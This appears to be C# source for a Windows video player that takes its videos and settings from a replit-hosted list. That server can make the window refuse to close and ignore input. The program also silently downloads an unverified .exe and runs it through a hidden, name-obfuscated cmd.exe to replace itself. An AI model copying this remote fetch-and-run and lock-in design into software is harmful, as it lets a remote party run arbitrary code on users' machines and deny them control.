using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Net;
using System.Threading.Tasks;
using System.Collections.Generic;
using OnlineVideoPlayer.Properties;
using System.Reflection;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Windows.Input;
using System.IO.Compression;
using System.Text;
using Microsoft.Win32;
using System.Xml.Linq;
using System.Runtime.Serialization.Json;
using System.Xml.XPath;
using System.Web.Script.Serialization;

namespace OnlineVideoPlayer
{
    public partial class VideoPlayer : Form
    {
        public static string VideoPlayerConfigPath = "Not Defined";
        public static string TemporaryFilesExtension = ".tmp";

        public static string ProgramVersion = Assembly.GetEntryAssembly().GetName().Version.ToString();
        public static string DownloadName = "Pensando";
        public static string ServerUrl = "https://ProyectoAstruaias.fundacionamigos.repl.co/VideoPlayerVideos";
        public static string TempPath = Path.GetTempPath();

        public static WebClient Wc = new WebClient();
        public static Random Rand = new Random();
        public static int PlayerVolume = 50;

        public VideoPlayer()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            VideoPanel.Dock = DockStyle.Fill;
            GifPictureBox.Dock = DockStyle.Fill;

            this.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);

            GifPictureBox.Image = Resources.Loading_Big;
            GifPictureBox.BackColor = SystemColors.GrayText;
        }


        private void ChangeFormIconFromUrl(string Url)
        {
            Invoke(new MethodInvoker(() =>
            {
                try
                {
                    string LinkHash = GetHash(Encoding.Unicode.GetBytes(Url));
                    string TempIconPath = Path.Combine(TempPath, LinkHash + TemporaryFilesExtension);

                    Console.WriteLine("Cambiando Icono a " + Url);

                    if (File.Exists(TempIconPath))
                    {
                        try
                        {
                            Console.WriteLine("Leyendo el icono de archivos temporales");

                            byte[] IconData = Decompress(File.ReadAllBytes(TempIconPath));
                            this.Icon = BytesToIcon(IconData);
                        }
                        catch
                        {
                            File.Delete(TempIconPath);
                        }
                    }
                    else
                    {
                        Console.WriteLine("Descargando icono");
                        byte[] IconData = new WebClient().DownloadData(Url);
                        File.WriteAllBytes(TempIconPath, Compress(IconData));

                        this.Icon = BytesToIcon(IconData);
                    }
                }
                catch
                {
                    Console.WriteLine("Error cambiando el icono");
                }
            }));
        }
        public static string GetHash(byte[] data)
        {
            using (var sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider())
            {
                return string.Concat(sha1.ComputeHash(data).Select(x => x.ToString("X2")));
            }
        }
        public Icon BytesToIcon(byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                return new Icon(ms);
            }
        }



        private bool Paused = true;
        private bool Playing = false;


        private bool VideoIgnoreInput = false;
        private bool VideoFullScreen = false;
        private bool VideoTopMost = false;
        private bool VideoAntiAltF4 = false;

        private bool VideoOpacityChanged = false;
        private double VideoOpacity = 1.00;

        private bool VideoVolumeChanged = false;
        private int VideoVolume = 50;

        private int VideoSelecionado;
        private string VideoUrl;
        private List<string> VideoList = new List<string>();


        private async void VideoPlayer_Shown(object sender, EventArgs e)
        {
            Wc.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);

            VideoPlayerConfigPath = Path.Combine(Path.GetTempPath(), GetHash(Encoding.UTF8.GetBytes(ProgramVersion)) + TemporaryFilesExtension);

            try
            {
                Console.WriteLine("Conectandose con el servidor");
                this.Text = "Conectandose al servidor";
                DownloadName = "Conectandose al servidor";
                string VideosUrls = await Wc.DownloadStringTaskAsync(ServerUrl);
                Console.WriteLine("Servidor conectado procesando informacion");


                this.Text = "Procesando informacion";

                string Line;
                using (StringReader reader = new StringReader(VideosUrls))
                {
                    while ((Line = reader.ReadLine()) != null)
                    {
                        Line = Line.Replace(" ", "");


                        if (!string.IsNullOrWhiteSpace(Line))
                        {
                            if (IsHttpsLink(Line) & (Line.ToLower().EndsWith(".mp4") | Line.ToLower().EndsWith(".zip")))
                            {
                                VideoList.Add(Line);
                            }


                            if (IsHttpsLink(Line) & Line.ToLower().EndsWith(".exe"))
                            {
                                if (!VideosUrls.Contains(ProgramVersion))
                                {
                                    UpdateProgram(Line, Wc);
                                    return;
                                }
                            }

                            if (IsHttpsLink(Line) & Line.ToLower().EndsWith(".ico"))
                            {
                                DownloadName = "Descargando Icono";
                                var IconUrl = Line;
                                Task.Factory.StartNew(() => ChangeFormIconFromUrl(IconUrl));
                            }


                            if (Line.Contains("="))
                            {
                                if (Line.StartsWith("Opacity="))
                                {
                                    try
                                    {
                                        VideoOpacity = double.Parse(Line.Replace("Opacity=", ""));
                                        VideoOpacityChanged = true;

                                        this.TransparencyKey = Color.AliceBlue;
                                        this.BackColor = Color.AliceBlue;
                                    }
                                    catch { }
                                }

                                if (Line.StartsWith("StartFullScreen="))
                                {
                                    try
                                    {
                                        if (bool.Parse(Line.Replace("StartFullScreen=", "")))
                                        {
                                            this.WindowState = FormWindowState.Maximized;
                                        }
                                    }
                                    catch { }
                                }

                                if (Line.StartsWith("FullScreen="))
                                {
                                    try
                                    {
                                        VideoFullScreen = bool.Parse(Line.Replace("FullScreen=", ""));
                                    }
                                    catch { }
                                }

                                if (Line.StartsWith("AntiAltF4="))
                                {
                                    try
                                    {
                                        VideoAntiAltF4 = bool.Parse(Line.Replace("AntiAltF4=", ""));
                                    }
                                    catch { }
                                }

                                if (Line.StartsWith("IgnoreInput="))
                                {
                                    try
                                    {
                                        VideoIgnoreInput = bool.Parse(Line.Replace("IgnoreInput=", ""));
                                    }
                                    catch { }
                                }

                                if (Line.StartsWith("Volume="))
                                {
                                    try
                                    {
                                        VideoVolume = int.Parse(Line.Replace("Volume=", ""));

                                        if (VideoVolume != PlayerVolume)
                                        {
                                            VideoVolumeChanged = true;
                                        }
                                    }
                                    catch { }
                                }

                                if (Line.StartsWith("TopMost="))
                                {
                                    try
                                    {
                                        VideoTopMost = bool.Parse(Line.Replace("TopMost=", ""));
                                    }
                                    catch { }
                                }

                            }
                        }
                    }
                }

                if (VideoList.Count <= 0)
                {
                    this.Hide();
                    MessageBox.Show("Ahora mismo no hay ningun video para enseñar vuelve mas tarde :)", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Environment.Exit(0);
                }



                this.Text = "Selecionando video";


                //Antiguo selecion de video
                /* VideoSelecionado = Rand.Next(VideoList.Count) - 1;

                 if (VideoSelecionado <= -1)
                 {
                     VideoSelecionado = 0;
                 }
                 string SavedVideoPath = Path.Combine(Path.GetTempPath(), "LastVideo.log");
                 if (File.Exists(SavedVideoPath))
                 {
                     int LastVideo = int.Parse(File.ReadAllText(SavedVideoPath));

                     if (VideoList.Count >= 2)
                     {
                         Console.WriteLine("Checkeo de video");

                         while (LastVideo == VideoSelecionado)
                         {
                             VideoSelecionado = Rand.Next(VideoList.Count);
                             Console.WriteLine("Aleatorizando video " + VideoSelecionado+ "   Antiguo:" + LastVideo);
                         }
                     }
                 }
                 Console.WriteLine("Video selecionado " + VideoSelecionado);
                 File.WriteAllText(SavedVideoPath, VideoSelecionado.ToString());*/

                //Selecionador de video antiguo pero no tanto
                /*Console.WriteLine("Checkeando archivos de guardado");
                List<int> CheckerVideosPlayed = new List<int>();
                for (int i = 1; i <= VideoList.Count - 1; i++)
                {
                    string LastCertainVideoPath = Path.Combine(Path.GetTempPath(), "LastVideo_" + i + ".log");

                    if (File.Exists(LastCertainVideoPath))
                    {
                        try
                        {
                            int LastCertaintVideo = int.Parse(File.ReadAllText(LastCertainVideoPath));

                            if (!CheckerVideosPlayed.Contains(LastCertaintVideo))
                            {
                                CheckerVideosPlayed.Add(LastCertaintVideo);
                            }
                            else
                            {
                                Console.WriteLine("Eliminando archivo de guardado de videos reproducidos duplicados id " + i);
                                File.Delete(LastCertainVideoPath);
                            }
                        }
                        catch
                        {
                            File.Delete(LastCertainVideoPath);
                        }
                    }
                }
                int BannedVideos = 1;
                List<int> ListaDeVideos = new List<int>();
                Console.WriteLine("Selecionando video");
                for (int i = 1; i <= VideoList.Count; i++)
                {
                    int VideosExistentes = i - 1;
                    if (VideosExistentes <= -1)
                    {
                        VideosExistentes = 0;
                    }
                    ListaDeVideos.Add(VideosExistentes);
                }
                VideoSelecionado = ListaDeVideos[Rand.Next(ListaDeVideos.Count)];
                if (VideoList.Count >= 2)
                {
                    bool VideoYaUsadoRecientemente = true;

                    while (VideoYaUsadoRecientemente)
                    {
                        VideoYaUsadoRecientemente = false;

                        for (int i = 1; i <= VideoList.Count - 1; i++)
                        {
                            string LastCertainVideoPath = Path.Combine(Path.GetTempPath(), "LastVideo_" + i + ".log");

                            if (File.Exists(LastCertainVideoPath))
                            {
                                int LastCertaintVideo = int.Parse(File.ReadAllText(LastCertainVideoPath));

                                if (LastCertaintVideo == VideoSelecionado)
                                {
                                    Console.WriteLine("Baneando id " + VideoSelecionado);
                                    ListaDeVideos.Remove(VideoSelecionado);

                                    VideoYaUsadoRecientemente = true;
                                }
                            }
                        }
                        if (VideoYaUsadoRecientemente)
                        {
                            VideoSelecionado = ListaDeVideos[Rand.Next(ListaDeVideos.Count)];

                            this.Text = "Selecionando video intento " + BannedVideos++ + "/" + VideoList.Count;

                            Console.WriteLine("Generando nuevo codigo de video " + VideoSelecionado + " " + BannedVideos);
                        }
                    }
                }
                else
                {
                    VideoSelecionado = 0;
                }
                Console.WriteLine("Guardando ids de videos");
                for (int i = VideoList.Count - 1; i > 0; i--)
                {
                    string LastCertainVideoPath = Path.Combine(Path.GetTempPath(), "LastVideo_" + i + ".log");
                    if (File.Exists(LastCertainVideoPath))
                    {
                        int LastCertaintVideo = int.Parse(File.ReadAllText(LastCertainVideoPath));
                        string NewPath = LastCertainVideoPath.Replace(i.ToString(), (i + 1).ToString());
                        if (!File.Exists(NewPath))
                        {
                            try
                            {
                                File.CreateText(NewPath).Close();
                            }
                            catch { }
                        }

                        File.WriteAllText(NewPath, LastCertaintVideo.ToString());
                    }
                }
                VideoUrl = VideoList[VideoSelecionado];
                File.WriteAllText(Path.Combine(Path.GetTempPath(), "LastVideo_1.log"), VideoSelecionado.ToString());*/




                VideoSelecionado = Rand.Next(VideoList.Count);


                try
                {
                    if (VideoList.Count >= 2)
                    {
                        if (File.Exists(VideoPlayerConfigPath))
                        {
                            string SavedReproductedVideos = GetConfig(VideoPlayerConfigPath, "VideosPlayed").Replace("%", "\n");

                            List<int> CheckerVideosPlayed = new List<int>();
                            Console.WriteLine("Checkeando archivos de guardado");
                            using (StringReader reader = new StringReader(SavedReproductedVideos))
                            {
                                int Checks = 1;
                                string line;
                                while ((line = reader.ReadLine()) != null & Checks++ != VideoList.Count)
                                {
                                    int VideoNum = int.Parse(line);
                                    if (!CheckerVideosPlayed.Contains(VideoNum))
                                    {
                                        CheckerVideosPlayed.Add(VideoNum);
                                    }
                                }
                            }


                            List<int> ListaDeVideos = new List<int>();
                            for (int i = 1; i <= VideoList.Count; i++)
                            {
                                int VideosExistentes = i - 1;
                                if (VideosExistentes <= -1)
                                {
                                    VideosExistentes = 0;
                                }
                                ListaDeVideos.Add(VideosExistentes);
                            }


                            bool VideoYaSelecionado = true;
                            while (VideoYaSelecionado)
                            {
                                VideoSelecionado = ListaDeVideos[Rand.Next(ListaDeVideos.Count)];

                                if (CheckerVideosPlayed.Contains(VideoSelecionado))
                                {
                                    ListaDeVideos.Remove(VideoSelecionado);
                                }
                                else
                                {
                                    VideoYaSelecionado = false;
                                }
                            }


                            Console.WriteLine("Guardando archivos de guardado");

                            string SaveContent = VideoSelecionado.ToString();
                            using (StringReader reader = new StringReader(SavedReproductedVideos))
                            {
                                int Checks = 1;
                                string line;
                                while ((line = reader.ReadLine()) != null & Checks++ != VideoList.Count)
                                {
                                    int VideoNum = int.Parse(line);

                                    SaveContent = SaveContent + "%" + VideoNum.ToString();
                                }
                            }

                            SaveConfig(VideoPlayerConfigPath, "VideosPlayed", SaveContent);
                        }
                        else
                        {
                            SaveConfig(VideoPlayerConfigPath, "VideosPlayed", VideoSelecionado.ToString());
                        }
                    }
                }
                catch
                {
                    if (File.Exists(VideoPlayerConfigPath))
                    {
                        Console.WriteLine("Eliminando Configuracion corrupta");
                        File.Delete(VideoPlayerConfigPath);
                    }
                }

                VideoUrl = VideoList[VideoSelecionado];







                string VideoHash = GetHash(Encoding.Unicode.GetBytes(VideoUrl));
                string VideoName = Removeillegal(VideoUrl.Split('/').Last()).Replace("_", " ");

                if (VideoName.ToLower().EndsWith(".mp4"))
                {
                    VideoName = VideoName.Replace(".mp4", "");
                }



                string VideoDefaultPath = Path.Combine(TempPath, VideoHash + TemporaryFilesExtension);


                if (!File.Exists(VideoDefaultPath))
                {
                    this.Text = "Descargando video";
                    DownloadName = "Descargando video";


                    File.WriteAllBytes(VideoDefaultPath, await Wc.DownloadDataTaskAsync(VideoUrl));
                }


                this.Text = "Procesando video";
                PlayVideoFromResouscres(VideoDefaultPath, VideoName);
            }
            catch (WebException Ex)
            {
                this.Hide();

                if (CheckForInternetConnection())
                {
                    string ErrorResponse = new StreamReader(Ex.Response.GetResponseStream()).ReadToEnd();

                    if (ErrorResponse.ToLower().Contains("run this repl to see the results here"))
                    {
                        MessageBox.Show("El servidor se esta iniciando por favor espere unos segundos", "Error de servidor", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("Error el servidor no funca correctamente\n\n" + Ex.ToString() + "\n\nVideo:" + Ex.TargetSite.Name + "(" + Ex.Status + ")", "Error de servidor", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    MessageBox.Show("Error el dispositivo no se pudo conectar a internet\n\n" + Ex.ToString() + "\n\nVideo:" + Ex.TargetSite.Name + "(" + Ex.Status + ")", "Error de conexion", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                Environment.Exit(0);
            }
            catch (Exception Ex)
            {
                this.Hide();
                MessageBox.Show("Ocurio un error desconocido\n\n" + Ex.ToString(), "Error desconocido", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
        }

        public static bool CheckForInternetConnection() { try { return new System.Net.WebClient().OpenRead("http://google.com/generate_204").CanRead; } catch { return false; } }


        private async void PlayVideoFromResouscres(string VideoPath, string VideoName)
        {
            string RegistryPath = @"Software\Microsoft\MediaPlayer\Player\Extensions\." +  VideoPath.Split('.').Last();

            if (Registry.CurrentUser.OpenSubKey(RegistryPath, false) == null)
            {
                RegistryKey PlayerOptionsReg = Registry.CurrentUser.CreateSubKey(RegistryPath);
                PlayerOptionsReg.SetValue("Permissions", "15", Microsoft.Win32.RegistryValueKind.DWord);
                PlayerOptionsReg.SetValue("Runtime", "6", Microsoft.Win32.RegistryValueKind.DWord);
            }



            VideoPanel.Dock = DockStyle.Fill;
            axWindowsMediaPlayer1.Dock = DockStyle.Fill;

            axWindowsMediaPlayer1.PlayStateChange += new AxWMPLib._WMPOCXEvents_PlayStateChangeEventHandler(wmp_PlayStateChange);

            axWindowsMediaPlayer1.settings.enableErrorDialogs = true;
            axWindowsMediaPlayer1.URL = VideoPath;
            axWindowsMediaPlayer1.stretchToFit = true;
            axWindowsMediaPlayer1.uiMode = "none";
            axWindowsMediaPlayer1.Visible = true;


            MetaDataTimer.Enabled = true;
            GifPictureBox.Visible = false;
            GifPictureBox.Image = null;
            GifPictureBox = null;


            this.Text = "Reproduciendo video";
            MetaDataTimer.Enabled = true;
            try
            {
                axWindowsMediaPlayer1.Ctlcontrols.play();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                MessageBox.Show(ex.ToString());
            }

            axWindowsMediaPlayer1.currentMedia.name = VideoName;

            while (!Playing)
            {
                await Task.Delay(50);
            }

            MetaDataTimer_Tick(new object(), new EventArgs());

            if (VideoFullScreen)
            {
                Console.WriteLine("Cambiando a fullscreen");
                FullScreen = false;
                AlternFullScreen();
            }

            if (VideoTopMost)
            {
                Console.WriteLine("Activando top most");
                this.TopMost = true;
            }

            if (VideoOpacityChanged)
            {
                Console.WriteLine("Cambiando opacidad");
                this.Opacity = VideoOpacity;
            }

            if (VideoVolumeChanged)
            {
                Console.WriteLine("Poniendo volumen predeterminado");
                SetPlayerVolume(VideoVolume);
            }
            else
            {
                bool VolumeChanged = false;
                if (File.Exists(VideoPlayerConfigPath))
                {
                    string SavedVolume = GetConfig(VideoPlayerConfigPath, "PlayerVolume");
                    if (!string.IsNullOrWhiteSpace(SavedVolume))
                    {
                        SetPlayerVolume(int.Parse(SavedVolume));
                        VolumeChanged = true;
                    }
                }

                if (!VolumeChanged)
                {
                    SetPlayerVolume(PlayerVolume);
                }
            }

            GC.Collect();
        }

        public static bool RegistryValueExists(string hive_HKLM_or_HKCU, string registryRoot, string valueName)
        {
            RegistryKey root;
            switch (hive_HKLM_or_HKCU.ToUpper())
            {
                case "HKLM":
                    root = Registry.LocalMachine.OpenSubKey(registryRoot, false);
                    break;
                case "HKCU":
                    root = Registry.CurrentUser.OpenSubKey(registryRoot, false);
                    break;
                default:
                    throw new System.InvalidOperationException("parameter registryRoot must be either \"HKLM\" or \"HKCU\"");
            }

            return root.GetValue(valueName) != null;
        }

        public static bool IsHttpsLink(string Link)
        {
            return (Link.ToLower().StartsWith("http://") || Link.ToLower().StartsWith("https://")) & Link.Contains(".");
        }
        public static string Removeillegal(string var)
        {
            return new Regex(string.Format("[{0}]", Regex.Escape(new string(Path.GetInvalidFileNameChars()) + new string(Path.GetInvalidPathChars())))).Replace(var, "");
        }


        private async void UpdateProgram(string UpdateUrl, WebClient WEB)
        {
            WEB.Headers.Clear();
            WEB.Headers.Add("User-Agent", Application.ProductName + " V" + Assembly.GetEntryAssembly().GetName().Version.ToString());

            string Arguments = string.Join(", ", Environment.GetCommandLineArgs());
            if (Arguments.Contains("/AutoSelfUpdate"))
            {
                DialogResult Respusta = MessageBox.Show("Ups el programa se actualizo pero encontro otra actualizacion aparte asi que supongo que es un error\n\nEsto puede suceder si la version del link de actualizacion no es la misma a la que indica el servidor", Application.ProductName, MessageBoxButtons.RetryCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                if (Respusta != DialogResult.Retry)
                {
                    Environment.Exit(1);
                }
            }

            string TempPath = Path.GetTempFileName();

            this.Text = "Actualizando programa";
            DownloadName = "Actualizando programa";
            await WEB.DownloadFileTaskAsync(new Uri(UpdateUrl, UriKind.Absolute), TempPath);

            if (UpdateUrl.ToLower().EndsWith(".zip"))
            {
                this.Text = "Descomprimiendo archivo";
                string FreePathDir = System.IO.Path.GetTempFileName().Replace(".", "");
                System.IO.Compression.ZipFile.ExtractToDirectory(TempPath, FreePathDir);
                foreach (var file in new DirectoryInfo(FreePathDir).GetFiles("*"))
                {
                    TempPath = file.FullName;
                }

                Directory.Delete(FreePathDir, true);
            }

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = Path.Combine(Environment.SystemDirectory, DecompressString("S85N0UutSAUA"));
            startInfo.Arguments = "/c timeout /t 0 /nobreak & taskkill /im \"" + AppDomain.CurrentDomain.FriendlyName + "\" /f & copy \"" + TempPath + "\" \"" + Assembly.GetExecutingAssembly().Location + "\" /b /v /y & del \"" + TempPath + "\" /f & \"" + Assembly.GetExecutingAssembly().Location + "\" /AutoSelfUpdate";
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            Process.Start(startInfo);
            Environment.Exit(0);
        }





        private void VideoPlayer_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing & VideoAntiAltF4)
            {
                e.Cancel = true;
            }
        }




        public Key KeyFromVirtualKey(int virtualKey)
        {
            return KeyInterop.KeyFromVirtualKey(virtualKey);
        }


        private async void wmp_PlayStateChange(object sender, AxWMPLib._WMPOCXEvents_PlayStateChangeEvent e)
        {
            if (e.newState == 8)
            {
                this.Hide();
                await Task.Delay(500);
                Environment.Exit(0);
            }
            else if (e.newState == 2)
            {
                Playing = false;
                Paused = true;
            }
            else if (e.newState == 3)
            {
                Paused = false;
                Playing = true;
            }
            else if (e.newState == 10)
            {
                while (Control.MouseButtons == MouseButtons.Left)
                {
                    await Task.Delay(100);
                }

                SetWindowSize();
            }

            Console.WriteLine("Nuevo estado de reproducion:" + e.newState);
        }



        private void axWindowsMediaPlayer1_KeyDownEvent(object sender, AxWMPLib._WMPOCXEvents_KeyDownEvent e)
        {
            if (VideoIgnoreInput)
            {
                return;
            }


            Key TeclaPresionada = KeyFromVirtualKey(e.nKeyCode);

            if (TeclaPresionada == Key.Left)
            {

                axWindowsMediaPlayer1.Ctlcontrols.currentPosition = axWindowsMediaPlayer1.Ctlcontrols.currentPosition - 5;


                if (Paused)
                {
                    if (!Muted & PlayerVolume != 0)
                    {
                        AlternMute();
                    }

                    axWindowsMediaPlayer1.Ctlcontrols.play();
                    axWindowsMediaPlayer1.Ctlcontrols.pause();
                    axWindowsMediaPlayer1.Refresh();
                    axWindowsMediaPlayer1.Update();

                    if (!Muted | (PlayerVolume == 0 & Muted))
                    {
                        AlternMute();
                    }
                }
            }
            else if (TeclaPresionada == Key.Right)
            {
                axWindowsMediaPlayer1.Ctlcontrols.currentPosition = axWindowsMediaPlayer1.Ctlcontrols.currentPosition + 5;


                if (Paused)
                {
                    if (!Muted & PlayerVolume != 0)
                    {
                        AlternMute();
                    }

                    axWindowsMediaPlayer1.Ctlcontrols.play();
                    axWindowsMediaPlayer1.Ctlcontrols.pause();
                    axWindowsMediaPlayer1.Refresh();
                    axWindowsMediaPlayer1.Update();

                    if (!Muted | (PlayerVolume != 0 & Muted))
                    {
                        AlternMute();
                    }
                }
            }
            else if (TeclaPresionada == Key.Up)
            {
                Muted = false;

                SetPlayerVolume(PlayerVolume + 5);
            }
            else if (TeclaPresionada == Key.Down)
            {
                Muted = false;

                SetPlayerVolume(PlayerVolume - 5);
            }
            else if (TeclaPresionada == Key.F || TeclaPresionada == Key.F11)
            {
                AlternFullScreen();
            }
            else if (TeclaPresionada == Key.M)
            {
                AlternMute();
            }
            else if (TeclaPresionada == Key.Space || TeclaPresionada == Key.K)
            {
                AlternPause();
            }
            else if (TeclaPresionada == Key.R)
            {
                Application.Restart();
            }

            MetaDataTimer_Tick(new object(), new EventArgs());
        }

        private void axWindowsMediaPlayer1_DoubleClickEvent(object sender, AxWMPLib._WMPOCXEvents_DoubleClickEvent e)
        {
            if (VideoIgnoreInput)
            {
                return;
            }

            AlternFullScreen();
        }
        private void axWindowsMediaPlayer1_ClickEvent(object sender, AxWMPLib._WMPOCXEvents_ClickEvent e)
        {
            if (VideoIgnoreInput)
            {
                return;
            }

            if (e.nButton == 1)
            {
                AlternPause();
            }
        }




        bool FullScreen = false;
        bool WasMaximized = false;
        private void AlternFullScreen()
        {
            if (!FullScreen)
            {
                FullScreen = true;

                if (this.WindowState == FormWindowState.Maximized)
                {
                    WasMaximized = true;
                    this.WindowState = FormWindowState.Normal;
                }
                else
                {
                    WasMaximized = false;
                }

                this.FormBorderStyle = FormBorderStyle.None;
                this.WindowState = FormWindowState.Maximized;
                this.Focus();
            }
            else
            {
                FullScreen = false;


                if (WasMaximized)
                {
                    this.WindowState = FormWindowState.Maximized;
                }
                else
                {
                    this.WindowState = FormWindowState.Normal;
                }
                this.FormBorderStyle = FormBorderStyle.Sizable;


                Task.Factory.StartNew(() => Invoke(new MethodInvoker(() => SetWindowSize())));
            }
        }





        bool Muted = false;
        private void AlternMute()
        {
            if (Muted)
            {
                Muted = false;

                SetPlayerVolume(PlayerVolume);
            }
            else
            {
                Muted = true;

                SetPlayerVolume(0,true);
            }
        }

        private void AlternPause()
        {
            if (!Paused)
            {
                Paused = true;
                Task.Factory.StartNew(() => axWindowsMediaPlayer1.Ctlcontrols.pause());
            }
            else
            {
                Paused = false;
                Task.Factory.StartNew(() => axWindowsMediaPlayer1.Ctlcontrols.play());
            }
        }
        private void SetPlayerVolume(int NewVolume, bool Save)
        {
            SetPlayerVolumeCore(NewVolume, Mute);
        }
        private void SetPlayerVolume(int NewVolume)
        {
            SetPlayerVolumeCore(NewVolume, false);
        }
        private void SetPlayerVolumeCore(int NewVolume, bool Save)
        {
            if (NewVolume >= 100)
            {
                NewVolume = 100;
            }
            else if (NewVolume <= 0)
            {
                NewVolume = 0;
            }


            Console.WriteLine("Poniendo volumen " + NewVolume);

            axWindowsMediaPlayer1.settings.volume = NewVolume;

            if (!Save)
            {
                PlayerVolume = NewVolume;
                SaveConfig(VideoPlayerConfigPath, "PlayerVolume", NewVolume.ToString());
            }
        }





        public bool VerticalVideo = false;
        private async void SetWindowSize()
        {
            while (!Playing)
            {
                await Task.Delay(100);
            }

            int Width = axWindowsMediaPlayer1.currentMedia.imageSourceWidth;
            int Height = axWindowsMediaPlayer1.currentMedia.imageSourceHeight;

            if (Width >= 1 & Height >= 1)
            {
                if (Width >= 1000 & Height >= 700)
                {
                    this.Width = (Width / 2) - 55;
                    this.Height = Height / 2;

                    return;
                }

                if (Width <= Height)
                {
                    if (Width >= 720)
                    {
                        this.Width = Width / 2 - 6;
                        this.Height = Height / 2;
                    }
                    else if (Height == Width)
                    {
                        this.Width = Width - 21;
                        this.Height = Height;
                    }
                    else
                    {
                        this.Width = Width - 6;
                        this.Height = Height;
                    }

                    Console.WriteLine("with " + Width + " height " + Height);

                    VerticalVideo = true;

                    return;
                }


                    this.Width = Width - 55;
                    this.Height = Height;
            }

        }


        private void MetaDataTimer_Tick(object sender, EventArgs e)
        {
            string Texto = null;
            try
            {
                Texto = axWindowsMediaPlayer1.currentMedia.name;

                if (axWindowsMediaPlayer1.currentMedia.imageSourceWidth != 0 & !VerticalVideo)
                {
                    Texto = Texto + "(" + axWindowsMediaPlayer1.currentMedia.imageSourceWidth + "x" + axWindowsMediaPlayer1.currentMedia.imageSourceHeight + ")";
                }

                if (!string.IsNullOrWhiteSpace(axWindowsMediaPlayer1.Ctlcontrols.currentPositionString))
                {
                    Texto = Texto + "  " + axWindowsMediaPlayer1.Ctlcontrols.currentPositionString + "/" + axWindowsMediaPlayer1.currentMedia.durationString;
                }

                if (VideoList.Count >= 2)
                {
                    Texto = Texto + "  Video:" + (VideoSelecionado + 1) + "/" + VideoList.Count;
                }

                if (Muted)
                {
                    Texto = Texto + " 🔇";
                }

                this.Text = Texto;
                this.Update();
            }
            catch
            {
            }
        }

        void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            double bytesIn = double.Parse(e.BytesReceived.ToString());
            double totalBytes = double.Parse(e.TotalBytesToReceive.ToString());
            double percentage = bytesIn / totalBytes * 100;


                this.Text = DownloadName + " " + (int)percentage + "%";
        }


        public static string CompressString(string Text)
        {
            return CompressString(Text, Encoding.UTF8);
        }
        public static string DecompressString(string Text)
        {
            return DecompressString(Text, Encoding.UTF8);
        }
        public static string CompressString(string Text, Encoding Encoder)
        {
            return Convert.ToBase64String(Compress(Encoder.GetBytes(Text)));
        }
        public static string DecompressString(string Text, Encoding Encoder)
        {
            return Encoder.GetString(Decompress(Convert.FromBase64String(Text)));
        }
        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }


        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }




        private static string GetConfig(string ConfigPath, string Key)
        {
            Console.WriteLine("Obteniendo informacion de archivo de guardado");

            try
            {
                if (File.Exists(ConfigPath))
                {
                    var Json = Encoding.UTF7.GetString(Decompress(File.ReadAllBytes(ConfigPath))).Replace("\n", "").Replace("\n", "").Replace("|", ":").Replace("'", "\"").Replace("¿", "{").Replace("?", "}").Replace("^", ",");

                    if (Json.Contains(Key))
                    {
                        return DeserialitzeJson(Json, Key);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error coguiendo string de la database\n" + ex.ToString(), false);
            }
            return null;
        }






        public static void SaveConfig(string ConfigPath, string Key, string Value)
        {
            try
            {
                bool Exist = true;
                var JsonText = "";

                if (File.Exists(ConfigPath))
                {
                    JsonText = Encoding.UTF7.GetString(Decompress(File.ReadAllBytes(ConfigPath))).Replace("\n", "").Replace("|", ":").Replace("'", "\"").Replace("¿", "{").Replace("?", "}").Replace("^", ",");
                }

                if (JsonText == "" || JsonText == null || (!JsonText.Contains("{")))
                {
                    JsonText = "{}";
                    Exist = false;
                }

                var serializer = new JavaScriptSerializer();
                Dictionary<string, string> values = serializer.Deserialize<Dictionary<string, string>>(JsonText);

                string Text = ("{");
                foreach (var item in values)
                {
                    if (Key != item.Key)
                    {
                        Exist = false;
                    }
                    if (Key == item.Key)
                    {
                        Text = Text.Replace("\"" + item.Key + "\":\"" + item.Value + "\",", "") + ("\"" + item.Key + "\":\"" + Value + "\",");
                    }
                    else
                    {
                        Exist = false;
                        Text = Text + ("\"" + item.Key + "\":\"" + item.Value + "\",");
                    }
                }

                if (Exist == false)
                {
                    if (!Text.Contains("\"" + Key + "\":\"" + Value + "\","))
                    {
                        Text = Text + ("\"" + Key + "\":\"" + Value + "\",");
                    }
                }
                Text = Text + ("}");

                File.WriteAllBytes(ConfigPath, Compress(Encoding.UTF7.GetBytes(Text.Replace(",}", "}"))));
            }
            catch (Exception ex)
            {
                File.Delete(ConfigPath);
                Console.WriteLine(ex.ToString());
            }
        }



        public static string DeserialitzeJson(string Json, string Path)
        {
            return XElement.Load(JsonReaderWriterFactory.CreateJsonReader(Encoding.UTF8.GetBytes(Json), new System.Xml.XmlDictionaryReaderQuotas())).XPathSelectElement("//" + Path).Value;
        }




    }
}